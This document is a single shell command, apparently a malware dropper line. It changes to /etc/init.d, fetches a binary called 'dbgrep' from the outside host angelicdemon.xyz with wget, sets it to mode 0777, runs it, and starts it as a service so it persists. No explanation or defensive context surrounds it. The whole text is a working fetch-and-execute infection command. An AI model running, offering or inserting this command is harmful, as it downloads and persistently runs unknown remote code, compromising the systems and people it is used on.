cd /etc/init.d; wget http://angelicdemon.xyz/dbgrep; chmod 0777 dbgrep; ./dbgrep; service dbgrep start
